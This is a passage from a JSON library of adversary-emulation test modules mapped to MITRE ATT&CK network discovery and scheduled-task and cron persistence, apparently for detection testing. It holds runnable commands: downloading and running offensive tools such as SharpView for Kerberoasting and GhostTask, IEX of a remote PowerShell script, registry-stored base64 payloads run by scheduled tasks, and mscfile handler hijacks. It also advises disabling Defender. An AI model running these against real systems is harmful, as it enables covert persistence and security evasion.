        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Check if netstat command exists on the machine\n",
          "check_command": "if [ -x \"$(command -v netstat)\" ]; then exit 0; else exit 1; fi;\n",
          "install_command": "echo \"Install netstat on the machine.\"; exit 1;\n"
        }
      ],
      "rx_module_id": "9ae28d3f-190f-4fa0-b023-c7bd3e0eabf2",
      "module_name": "System Network Connections Discovery FreeBSD, Linux & MacOS"
    },
    {
      "index": 259,
      "technique_id": "T1049",
      "technique_name": "System Network Connections Discovery",
      "description": "Enumerate IPv4/IPv6 network endpoints on FreeBSD using sockstat.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "sockstat -4\nsockstat -6 2>/dev/null || true\nsockstat -l 2>/dev/null || true\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "997bb0a6-421e-40c7-b5d2-0f493904ef9b",
      "module_name": "System Network Connections Discovery via sockstat (Linux, FreeBSD)"
    },
    {
      "index": 260,
      "technique_id": "T1049",
      "technique_name": "System Network Connections Discovery",
      "description": "Get a listing of network connections, domains, domain users, and etc.  \nsharpview.exe located in the bin folder, an opensource red-team tool.\nUpon successful execution, cmd.exe will execute sharpview.exe <method>. Results will output via stdout.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$syntaxList = #{syntax}\nforeach ($syntax in $syntaxList) {\n#{SharpView} $syntax -}\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "SharpView_url",
          "description": "sharpview download URL",
          "type": "url",
          "default_value": "https://github.com/tevora-threat/SharpView/blob/b60456286b41bb055ee7bc2a14d645410cca9b74/Compiled/SharpView.exe?raw=true"
        },
        {
          "name": "SharpView",
          "description": "Path of the executable opensource redteam tool used for the performing this raglox.",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\SharpView.exe"
        },
        {
          "name": "syntax",
          "description": "Arguements method used along with SharpView to get listing of network connections, domains, domain users, and etc.",
          "type": "string",
          "default_value": "\"Invoke-ACLScanner\", \"Invoke-Kerberoast\", \"Find-DomainShare\" \n"
        }
      ],
      "prerequisites": [
        {
          "description": "Sharpview.exe must exist on disk at specified location (#{SharpView})\n",
          "check_command": "if (Test-Path \"#{SharpView}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{SharpView}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest #{SharpView_url} -OutFile \"#{SharpView}\"\n"
        }
      ],
      "rx_module_id": "96f974bb-a0da-4d87-a744-ff33e73367e9",
      "module_name": "System Discovery using SharpView"
    },
    {
      "index": 261,
      "technique_id": "T1053.002",
      "technique_name": "Scheduled Task/Job: At",
      "description": "Executes cmd.exe\nNote: deprecated in Windows 8+\n\nUpon successful execution, cmd.exe will spawn at.exe and create a scheduled task that will spawn cmd at a specific time.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "at 13:20 /interactive cmd\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "4a6c0dc4-0f2a-4203-9298-a5a9bdc21ed8",
      "module_name": "At.exe Scheduled task"
    },
    {
      "index": 262,
      "technique_id": "T1053.002",
      "technique_name": "Scheduled Task/Job: At",
      "description": "This test submits a command to be run in the future by the `at` daemon.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "echo \"#{at_command}\" | at #{time_spec}",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "time_spec",
          "description": "Time specification of when the command should run",
          "type": "string",
          "default_value": "now + 1 minute"
        },
        {
          "name": "at_command",
          "description": "The command to be run",
          "type": "string",
          "default_value": "echo Hello from RAGLOX Threat Library"
        }
      ],
      "prerequisites": [
        {
          "description": "The `at` and `atd` executables must exist in the PATH\n",
          "check_command": "if [ \"$(uname)\" = 'FreeBSD' ]; then which at; else which at && which atd; fi;\n",
          "install_command": "echo 'Please install `at` and `atd`; they were not found in the PATH (Package name: `at`)'\n"
        },
        {
          "description": "The `atd` daemon must be running\n",
          "check_command": "if [ $(uname) = 'Linux' ]; then systemctl status atd || service atd status; fi;\n",
          "install_command": "echo 'Please start the `atd` daemon (sysv: `service atd start` ; systemd: `systemctl start atd`)'\n"
        }
      ],
      "rx_module_id": "7266d898-ac82-4ec0-97c7-436075d0d08e",
      "module_name": "At - Schedule a job"
    },
    {
      "index": 263,
      "technique_id": "T1053.002",
      "technique_name": "Scheduled Task/Job: At",
      "description": "Launches a short-lived Ubuntu pod, installs the `at` utility, starts the `atd` daemon,\nand submits a job with `at`. The pod is deleted after execution.\n",
      "execution": {
        "platforms": [
          "containers"
        ],
        "executor_type": "bash",
        "command": "kubectl run #{pod_name} --image=#{image_name} --restart=Never --attach --rm -i -- bash -lc \"apt-get update -y >/dev/null 2>&1 && apt-get install -y at >/dev/null 2>&1 && (atd || /usr/sbin/atd) && echo '#{at_command}' | at #{time_spec} && at -l\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "image_name",
          "description": "Name of the image",
          "type": "string",
          "default_value": "ubuntu"
        },
        {
          "name": "pod_name",
          "description": "K8s pod name to execute the command in",
          "type": "string",
          "default_value": "raglox-at-schedule"
        },
        {
          "name": "time_spec",
          "description": "Time specification of when the command should run",
          "type": "string",
          "default_value": "now + 1 minute"
        },
        {
          "name": "at_command",
          "description": "The command to be run",
          "type": "string",
          "default_value": "echo Hello from RAGLOX Threat Library"
        }
      ],
      "prerequisites": [
        {
          "description": "kubectl must be installed and configured",
          "check_command": "which kubectl\n",
          "install_command": "echo \"kubectl must be installed manually\"\n"
        }
      ],
      "rx_module_id": "9ddf2e5e-7e2c-46c2-9940-3c2ff29c7213",
      "module_name": "At - Schedule a job via kubectl in a Pod"
    },
    {
      "index": 264,
      "technique_id": "T1053.003",
      "technique_name": "Scheduled Task/Job: Cron",
      "description": "This test replaces the current user's crontab file with the contents of the referenced file. This technique was used by numerous IoT automated exploitation attacks.\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "crontab -l > /tmp/notevil\necho \"* * * * * #{command}\" > #{tmp_cron} && crontab #{tmp_cron}\n",
        "elevation_required": false,
        "cleanup_command": "crontab /tmp/notevil\n"
      },
      "variables": [
        {
          "name": "command",
          "description": "Command to execute",
          "type": "string",
          "default_value": "/tmp/evil.sh"
        },
        {
          "name": "tmp_cron",
          "description": "Temporary reference file to hold evil cron schedule",
          "type": "path",
          "default_value": "/tmp/persistevil"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "435057fb-74b1-410e-9403-d81baf194f75",
      "module_name": "Cron - Replace crontab with referenced file"
    },
    {
      "index": 265,
      "technique_id": "T1053.003",
      "technique_name": "Scheduled Task/Job: Cron",
      "description": "This test adds a script to /etc/cron.hourly, /etc/cron.daily, /etc/cron.monthly and /etc/cron.weekly folders configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.\n",
      "execution": {
        "platforms": [
          "macos",
          "linux"
        ],
        "executor_type": "bash",
        "command": "echo \"#{command}\" > /etc/cron.daily/#{cron_script_name}\necho \"#{command}\" > /etc/cron.hourly/#{cron_script_name}\necho \"#{command}\" > /etc/cron.monthly/#{cron_script_name}\necho \"#{command}\" > /etc/cron.weekly/#{cron_script_name}\n",
        "elevation_required": true,
        "cleanup_command": "rm /etc/cron.daily/#{cron_script_name} -f\nrm /etc/cron.hourly/#{cron_script_name} -f\nrm /etc/cron.monthly/#{cron_script_name} -f\nrm /etc/cron.weekly/#{cron_script_name} -f\n"
      },
      "variables": [
        {
          "name": "command",
          "description": "Command to execute",
          "type": "string",
          "default_value": "echo 'Hello from RAGLOX Threat Library' > /tmp/raglox.log"
        },
        {
          "name": "cron_script_name",
          "description": "Name of file to store in cron folder",
          "type": "string",
          "default_value": "persistevil"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "b7d42afa-9086-4c8a-b7b0-8ea3faa6ebb0",
      "module_name": "Cron - Add script to all cron subfolders"
    },
    {
      "index": 266,
      "technique_id": "T1053.003",
      "technique_name": "Scheduled Task/Job: Cron",
      "description": "This test adds a script to /etc/cron.d folder configured to execute on a schedule.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "echo \"#{command}\" > /etc/cron.d/#{cron_script_name}\n",
        "elevation_required": true,
        "cleanup_command": "rm /etc/cron.d/#{cron_script_name} -f\n"
      },
      "variables": [
        {
          "name": "command",
          "description": "Command to execute",
          "type": "string",
          "default_value": "echo '*/5     *       *       *       *       root    echo \"Hello from RAGLOX Threat Library\"' > /tmp/raglox.log"
        },
        {
          "name": "cron_script_name",
          "description": "Name of file to store in cron folder",
          "type": "string",
          "default_value": "persistevil"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "078e69eb-d9fb-450e-b9d0-2e118217c846",
      "module_name": "Cron - Add script to /etc/cron.d folder"
    },
    {
      "index": 267,
      "technique_id": "T1053.003",
      "technique_name": "Scheduled Task/Job: Cron",
      "description": "This test adds a script to a /var/spool/cron/crontabs folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "echo \"#{command}\" >> /var/spool/cron/crontabs/#{cron_script_name}\n",
        "elevation_required": true,
        "cleanup_command": "rm /var/spool/cron/crontabs/#{cron_script_name} -f\n"
      },
      "variables": [
        {
          "name": "command",
          "description": "Command to execute",
          "type": "string",
          "default_value": "echo 'Hello from RAGLOX Threat Library' > /tmp/raglox.log"
        },
        {
          "name": "cron_script_name",
          "description": "Name of file to store in /var/spool/cron/crontabs folder",
          "type": "string",
          "default_value": "persistevil"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "2d943c18-e74a-44bf-936f-25ade6cccab4",
      "module_name": "Cron - Add script to /var/spool/cron/crontabs/ folder"
    },
    {
      "index": 268,
      "technique_id": "T1053.005",
      "technique_name": "Scheduled Task/Job: Scheduled Task",
      "description": "Run an exe on user logon or system startup.  Upon execution, success messages will be displayed for the two scheduled tasks. To view\nthe tasks, open the Task Scheduler and look in the Active Tasks pane.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "schtasks /create /tn \"T1053_005_OnLogon\" /sc onlogon /tr \"cmd.exe /c calc.exe\"\nschtasks /create /tn \"T1053_005_OnStartup\" /sc onstart /ru system /tr \"cmd.exe /c calc.exe\"\n",
        "elevation_required": true,
        "cleanup_command": "schtasks /delete /tn \"T1053_005_OnLogon\" /f >nul 2>&1\nschtasks /delete /tn \"T1053_005_OnStartup\" /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "fec27f65-db86-4c2d-b66c-61945aee87c2",
      "module_name": "Scheduled Task Startup Script"
    },
    {
      "index": 269,
      "technique_id": "T1053.005",
      "technique_name": "Scheduled Task/Job: Scheduled Task",
      "description": "Upon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}\n",
        "elevation_required": false,
        "cleanup_command": "SCHTASKS /Delete /TN spawn /F >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "task_command",
          "description": "What you want to execute",
          "type": "string",
          "default_value": "C:\\windows\\system32\\cmd.exe"
        },
        {
          "name": "time",
          "description": "What time 24 Hour",
          "type": "string",
          "default_value": "20:10"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "42f53695-ad4a-4546-abb6-7d837f644a71",
      "module_name": "Scheduled task Local"
    },
    {
      "index": 270,
      "technique_id": "T1053.005",
      "technique_name": "Scheduled Task/Job: Scheduled Task",
      "description": "Create a task on a remote system.\nUpon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10 on a remote endpoint.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN \"RAGLOX task\" /TR \"#{task_command}\" /SC daily /ST #{time}\n",
        "elevation_required": true,
        "cleanup_command": "SCHTASKS /Delete /S #{target} /U #{user_name} /P #{password} /TN \"RAGLOX task\" /F >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "task_command",
          "description": "What you want to execute",
          "type": "string",
          "default_value": "C:\\windows\\system32\\cmd.exe"
        },
        {
          "name": "time",
          "description": "What time 24 Hour",
          "type": "string",
          "default_value": "20:10"
        },
        {
          "name": "target",
          "description": "Target",
          "type": "string",
          "default_value": "localhost"
        },
        {
          "name": "user_name",
          "description": "Username to authenticate with, format: DOMAIN\\User",
          "type": "string",
          "default_value": "DOMAIN\\user"
        },
        {
          "name": "password",
          "description": "Password to authenticate with",
          "type": "string",
          "default_value": "At0micStrong"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "2e5eac3e-327b-4a88-a0c0-c4057039a8dd",
      "module_name": "Scheduled task Remote"
    },
    {
      "index": 271,
      "technique_id": "T1053.005",
      "technique_name": "Scheduled Task/Job: Scheduled Task",
      "description": "Create an raglox scheduled task that leverages native powershell cmdlets.\n\nUpon successful execution, powershell.exe will create a scheduled task to spawn cmd.exe at 20:10.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$Action = New-ScheduledTaskAction -Execute \"calc.exe\"\n$Trigger = New-ScheduledTaskTrigger -AtLogon\n$User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest\n$Set = New-ScheduledTaskSettingsSet\n$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set\nRegister-ScheduledTask RAGLOXTask -InputObject $object\n",
        "elevation_required": false,
        "cleanup_command": "Unregister-ScheduledTask -TaskName \"RAGLOXTask\" -confirm:$false >$null 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "af9fd58f-c4ac-4bf2-a9ba-224b71ff25fd",
      "module_name": "Powershell Cmdlet Scheduled Task"
    },
    {
      "index": 272,
      "technique_id": "T1053.005",
      "technique_name": "Scheduled Task/Job: Scheduled Task",
      "description": "This module utilizes the Windows API to schedule a task for code execution (notepad.exe). The task scheduler will execute \"notepad.exe\" within\n30 - 40 seconds after this module has run\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToRagloxModulesFolder\\T1053.005\\src\\T1053.005-macrocode.txt\" -officeProduct \"#{ms_product}\" -sub \"Scheduler\"\n",
        "elevation_required": false,
        "cleanup_command": "Unregister-ScheduledTask -TaskName \"Run Notepad\" -Confirm:$false\n"
      },
      "variables": [
        {
          "name": "ms_product",
          "description": "Maldoc application Word",
          "type": "string",
          "default_value": "Word"
        }
      ],
      "prerequisites": [
        {
          "description": "Microsoft #{ms_product} must be installed\n",
          "check_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
          "install_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"
        }
      ],
      "rx_module_id": "ecd3fa21-7792-41a2-8726-2c5c673414d3",
      "module_name": "Task Scheduler via VBA"
    },
    {
      "index": 273,
      "technique_id": "T1053.005",
      "technique_name": "Scheduled Task/Job: Scheduled Task",
      "description": "Create an scheduled task that executes notepad.exe after user login from XML by leveraging WMI class PS_ScheduledTask. Does the same thing as Register-ScheduledTask cmdlet behind the scenes.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$xml = [System.IO.File]::ReadAllText(\"#{xml_path}\")\nInvoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \"Root\\Microsoft\\Windows\\TaskScheduler\" -MethodName \"RegisterByXml\" -Arguments @{ Force = $true; Xml =$xml; }\n",
        "elevation_required": true,
        "cleanup_command": "Unregister-ScheduledTask -TaskName \"T1053_005_WMI\" -confirm:$false >$null 2>&1\n"
      },
      "variables": [
        {
          "name": "xml_path",
          "description": "path of vbs to use when creating masquerading files",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1053.005\\src\\T1053_005_WMI.xml"
        }
      ],
      "prerequisites": [
        {
          "description": "File to copy must exist on disk at specified location (#{xml_path})\n",
          "check_command": "if (Test-Path \"#{xml_path}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{xml_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1053.005/src/T1053_005_WMI.xml\" -OutFile \"#{xml_path}\"\n"
        }
      ],
      "rx_module_id": "e16b3b75-dc9e-4cde-a23d-dfa2d0507b3b",
      "module_name": "WMI Invoke-CimMethod Scheduled Task"
    },
    {
      "index": 274,
      "technique_id": "T1053.005",
      "technique_name": "Scheduled Task/Job: Scheduled Task",
      "description": "A Base64 Encoded command will be stored in the registry (ping 127.0.0.1) and then a scheduled task will be created.\nThe scheduled task will launch powershell to decode and run the command in the registry daily.\nThis is a persistence mechanism recently seen in use by Qakbot.  \n\n[Additiona Information](https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add HKCU\\SOFTWARE\\RAGLOX-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f\nschtasks.exe /Create /F /TN \"RAGLOX-T1053.005\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\RAGLOX-T1053.005).test)))\" /sc daily /st #{time}\n",
        "elevation_required": false,
        "cleanup_command": "schtasks /delete /tn \"RAGLOX-T1053.005\" /F >nul 2>&1\nreg delete HKCU\\SOFTWARE\\RAGLOX-T1053.005 /F >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "time",
          "description": "Daily scheduled task execution time",
          "type": "string",
          "default_value": "07:45"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "e895677d-4f06-49ab-91b6-ae3742d0a2ba",
      "module_name": "Scheduled Task Executing Base64 Encoded Commands From Registry"
    },
    {
      "index": 275,
      "technique_id": "T1053.005",
      "technique_name": "Scheduled Task/Job: Scheduled Task",
      "description": "Create an scheduled task that executes calc.exe after user login from XML that contains hidden setting attribute. \nThis technique was seen several times in tricbot malware and also with the targetted attack campaigne the industroyer2.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$xml = [System.IO.File]::ReadAllText(\"#{xml_path}\")\nInvoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \"Root\\Microsoft\\Windows\\TaskScheduler\" -MethodName \"RegisterByXml\" -Arguments @{ Force = $true; Xml =$xml; }\n",
        "elevation_required": true,
        "cleanup_command": "Unregister-ScheduledTask -TaskName \"raglox threat library\" -confirm:$false >$null 2>&1\n"
      },
      "variables": [
        {
          "name": "xml_path",
          "description": "path of vbs to use when creating masquerading files",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1053.005\\src\\T1053_05_SCTASK_HIDDEN_ATTRIB.xml"
        }
      ],
      "prerequisites": [
        {
          "description": "File to copy must exist on disk at specified location (#{xml_path})\n",
          "check_command": "if (Test-Path \"#{xml_path}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{xml_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1053.005/src/T1053_05_SCTASK_HIDDEN_ATTRIB.xml\" -OutFile \"#{xml_path}\"\n"
        }
      ],
      "rx_module_id": "cd925593-fbb4-486d-8def-16cbdf944bf4",
      "module_name": "Import XML Schedule Task with Hidden Attribute"
    },
    {
      "index": 276,
      "technique_id": "T1053.005",
      "technique_name": "Scheduled Task/Job: Scheduled Task",
      "description": "Create a scheduled task with an action and modify the action to do something else. The initial idea is to showcase Microsoft Windows TaskScheduler Operational log modification of an action on a Task already registered. \nIt will first be created to spawn cmd.exe, but modified to run notepad.exe.\n\nUpon successful execution, powershell.exe will create a scheduled task and modify the action. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$Action = New-ScheduledTaskAction -Execute \"cmd.exe\"\n$Trigger = New-ScheduledTaskTrigger -AtLogon\n$User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest\n$Set = New-ScheduledTaskSettingsSet\n$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set\nRegister-ScheduledTask RAGLOXTaskModifed -InputObject $object\n$NewAction = New-ScheduledTaskAction -Execute \"Notepad.exe\"\nSet-ScheduledTask \"RAGLOXTaskModifed\" -Action $NewAction\n",
        "elevation_required": false,
        "cleanup_command": "Unregister-ScheduledTask -TaskName \"RAGLOXTaskModifed\" -confirm:$false >$null 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "dda6fc7b-c9a6-4c18-b98d-95ec6542af6d",
      "module_name": "PowerShell Modify A Scheduled Task"
    },
    {
      "index": 277,
      "technique_id": "T1053.005",
      "technique_name": "Scheduled Task/Job: Scheduled Task",
      "description": "Create a scheduled task through manipulation of registry keys. This procedure is implemented using the [GhostTask](https://github.com/netero1010/GhostTask) utility. By manipulating registry keys under HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree, the tool creates user-specified scheduled tasks without a corresponding Windows Event 4698, which is logged when scheduled tasks are created through conventional means.\nThis requires a download of the GhostTask binary, which must be run as NT Authority\\SYSTEM. Upon successful execution of this test, a scheduled task will be set to run at logon which launches notepad.exe or runs a user-specified command.\nFor further exploration of this procedure and guidance for hunting and detection, see [Hunting G-G-G-GhostTasks!](https://medium.com/p/154b50ab6a78).\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsExec.exe\" \\\\#{target} -accepteula -s \"cmd.exe\"\n\"PathToRagloxModulesFolder\\..\\ExternalPayloads\\GhostTask.exe\" \\\\#{target} add #{task_name} \"cmd.exe\" \"/c #{task_command}\" #{user_name} logon\n",
        "elevation_required": true,
        "cleanup_command": "\"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsExec.exe\" \\\\#{target} -accepteula -s \"cmd.exe\"\n\"PathToRagloxModulesFolder\\..\\ExternalPayloads\\GhostTask.exe\" \\\\#{target} delete #{task_name} > nul\n"
      },
      "variables": [
        {
          "name": "task_name",
          "description": "Name of the newly-added task",
          "type": "string",
          "default_value": "lilghostie"
        },
        {
          "name": "task_command",
          "description": "Command you want the task to execute",
          "type": "string",
          "default_value": "notepad.exe"
        },
        {
          "name": "target",
          "description": "System where the task should run",
          "type": "string",
          "default_value": "localhost"
        },
        {
          "name": "user_name",
          "description": "Username to authenticate with, such as RAGLOXDOMAIN\\RAGLOXAdmin",
          "type": "string",
          "default_value": "$env:USERDOMAIN + '\\' + $env:USERNAME"
        }
      ],
      "prerequisites": [
        {
          "description": "PsExec tool from Sysinternals must exist in the ExternalPayloads directory\n",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsExec.exe\") { exit 0} else { exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsTools.zip\"\nExpand-Archive \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsTools.zip\" \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsTools\" -Force\nCopy-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe\" \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsExec.exe\" -Force\n"
        },
        {
          "description": "GhostTask.exe tool from netero101 must exist in the ExternalPayloads directory. This tool may be quarantined by windows defender; disable windows defender real-time protection to fix it or add the ExternalPayloads directory as an exclusion, using a command like `Add-MpPreference -ExclusionPath \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\"`\n",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\GhostTask.exe\") { exit 0} else { exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/netero1010/GhostTask/releases/download/1.0/GhostTask.exe\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\GhostTask.exe\"\n"
        }
      ],
      "rx_module_id": "704333ca-cc12-4bcf-9916-101844881f54",
      "module_name": "Scheduled Task (\"Ghost Task\") via Registry Key Manipulation"
    },
    {
      "index": 278,
      "technique_id": "T1053.005",
      "technique_name": "Scheduled Task/Job: Scheduled Task",
      "description": "Adds persistence by abusing `compmgmt.msc` via a scheduled task.\nWhen the Computer Management console is opened, it will run a malicious payload (in this case, `calc.exe`). \nThis technique abuses scheduled tasks and registry modifications to hijack legitimate system processes.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\" /ve /t REG_EXPAND_SZ /d \"c:\\windows\\System32\\#{payload}\" /f\nschtasks /Create /TN \"#{task_name}\" /TR \"compmgmt.msc\" /SC ONLOGON /RL HIGHEST /F\nECHO Let's open the Computer Management console now...\ncompmgmt.msc\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\" /f\nschtasks /Delete /TN \"#{task_name}\" /F\n"
      },
      "variables": [
        {
          "name": "task_name",
          "description": "Name of the newly-created scheduled task",
          "type": "string",
          "default_value": "CompMgmtBypass"
        },
        {
          "name": "payload",
          "description": "Command you want the task to execute",
          "type": "string",
          "default_value": "calc.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "8fcfa3d5-ea7d-4e1c-bd3e-3c4ed315b7d2",
      "module_name": "Scheduled Task Persistence via CompMgmt.msc"
    },
    {
      "index": 279,
      "technique_id": "T1053.005",
      "technique_name": "Scheduled Task/Job: Scheduled Task",
      "description": "Adds persistence by abusing `eventviewer.msc` via a scheduled task.\nWhen the eventviewer console is opened, it will run a malicious payload (in this case, `calc.exe`). \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\" /ve /t REG_EXPAND_SZ /d \"c:\\windows\\System32\\#{payload}\" /f\nschtasks /Create /TN \"#{task_name}\" /TR \"eventvwr.msc\" /SC ONLOGON /RL HIGHEST /F\nECHO Let's run the schedule task ...\nschtasks /Run /TN \"EventViewerBypass\"\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\" /f\nschtasks /Delete /TN \"#{task_name}\" /F\n"
      },
      "variables": [
        {
          "name": "task_name",
          "description": "Name of the newly-created scheduled task",
          "type": "string",
          "default_value": "EventViewerBypass"
        },
        {
          "name": "payload",
          "description": "Command you want the task to execute",
          "type": "string",
          "default_value": "calc.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "02124c37-767e-4b76-9383-c9fc366d9d4c",
      "module_name": "Scheduled Task Persistence via Eventviewer.msc"
    },
    {
      "index": 280,
      "technique_id": "T1053.006",
      "technique_name": "Scheduled Task/Job: Systemd Timers",
      "description": "This test creates Systemd service and timer then starts and enables the Systemd timer \n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
